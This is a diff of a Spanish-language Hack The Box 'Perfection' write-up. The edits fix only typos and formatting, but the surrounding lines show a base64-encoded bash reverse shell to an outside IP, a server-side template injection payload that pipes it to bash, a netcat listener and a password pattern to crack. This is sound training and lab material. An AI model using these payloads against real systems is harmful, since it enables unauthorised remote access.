@@ -48,7 +48,7 @@ Vulnerable a Server Side Template Injection.
 ![](/assets/img/htb-writeup-perfection/perfection6.png)
 ![](/assets/img/htb-writeup-perfection/perfection7.png)
 
-Creo el payload el base64.
+Creo el payload en base64.
 
 ```terminal
 -$ echo 'bash -c "bash -i >& /dev/tcp/10.10.16.65/4444 0>&1"' > payload.sh
@@ -56,13 +56,15 @@ Creo el payload el base64.
 -$ cat payload.sh | base64 | xclip -sel clip
 YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi42NS80NDQ0IDA+JjEiCg==
 ```
-El payload quedaria de la siguiente manera '%0A<%25%3d+system("echo+'YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi42NS80NDQ0IDA+JjEiCg=='+|base64+-d+|bash")+%25>'.
+El payload quedaria de la siguiente manera:
+
+* '%0A<%25%3d+system("echo+'YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi42NS80NDQ0IDA+JjEiCg=='+|base64+-d+|bash")+%25>'.
 
 ```terminal
 -$ nc -nlvp 4444
 	lisening on [any] 4444 ...
 ```
-Luego de ponerme en escucha con 'Netcat', envio la peticion 'POST'.
+Luego de ponerme en escucha con Netcat, envio la peticion 'POST'.
 
 ![](/assets/img/htb-writeup-perfection/perfection8.png)
 
@@ -85,8 +87,8 @@ Enumerando el sistema, encuentro dos archivos importantes: 'pupilpath_credential
 
 Con esta información, puedo reconstruir gran parte de la contraseña:
 ```text
-{firstname}_{firstname backwards}_{randomly generated ineger between 1 and 1.000.000.000}
-   susan   _       nasus         _                   ?????????
+{firstname}_{firstname backwards}_{randomly generated integer between 1 and 1.000.000.000}
+   susan   _       nasus         _                    ?????????
 ```
 Solo me restaría encontrar el número entre 1 y 1.000.000.000, lo cual es fácilmente descifrable conociendo el hash.
 
